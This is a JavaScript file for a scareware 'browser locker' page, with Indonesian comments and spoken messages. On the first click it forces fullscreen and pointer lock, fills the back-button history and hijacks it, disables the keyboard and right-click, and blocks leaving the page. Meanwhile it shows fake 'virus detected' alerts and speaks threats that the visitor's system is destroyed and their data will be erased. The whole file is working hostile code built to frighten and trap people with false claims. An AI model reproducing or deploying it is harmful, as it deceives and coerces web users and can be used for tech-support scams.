/* X3-R3X EXTREME ENGINE 
   STATUS: PSYCHOLOGICAL WARFARE ACTIVE
*/

let synth = window.speechSynthesis;
let active = false;

function speak(msg) {
    let u = new SpeechSynthesisUtterance(msg);
    u.lang = 'id-ID'; u.pitch = 0.1; u.rate = 0.8;
    synth.speak(u);
}

function initX3Protocol() {
    if (active) return;
    active = true;

    // 1. Fullscreen & Pointer Lock
    let d = document.documentElement;
    if (d.requestFullscreen) d.requestFullscreen();
    d.requestPointerLock();

    // 2. Efek Visual & Suara
    document.getElementById('iron-lockdown').style.display = 'block';
    document.getElementById('viewport').classList.add('shaking');
    speak("Sistem lo sudah hancur. Jangan coba-coba keluar atau data lo hangus.");

    // 3. HISTORY POISONING (Bikin tombol BACK lumpuh total)
    // Kita penuhi history sampe ribuan kali
    for (let i = 0; i < 500; i++) {
        window.history.pushState("no-back", null, null);
    }
    
    window.onpopstate = function(event) {
        // Setiap kali mereka neken BACK, kita lempar balik ke sini + kasih ALERT
        window.history.pushState("no-back", null, null);
        alert("CRITICAL ERROR: R3X_VIRUS_DETECTED. NAVIGATION_DISABLED.");
        speak("Gak usah coba balik. Lo terjebak.");
    };

    // 4. INFINITE ALERT TRAP (Bikin browser nge-freeze)
    // Kalau mereka nyoba interaksi, browser bakal sibuk ngurusin alert
    setInterval(() => {
        if(active) {
            console.log("X3_STAY_ACTIVE");
        }
    }, 100);

    // 5. BLOCK SEMUA REFRESH & TAB CLOSE
    window.onbeforeunload = function() {
        return "Yakin mau keluar? Seluruh data lo akan terhapus permanen sekarang!";
    };

    // 6. Matikan Klik Kanan & Keyboard
    document.onkeydown = () => false;
    document.addEventListener('contextmenu', e => e.preventDefault());
}

function r3xOverride(e) {
    e.stopPropagation();
    active = false;
    synth.cancel();
    window.onbeforeunload = null;
    alert("R3X_AUTH_OK. SYSTEM_RESTORED.");
    location.href = "https://google.com";
}

document.body.addEventListener('click', initX3Protocol);
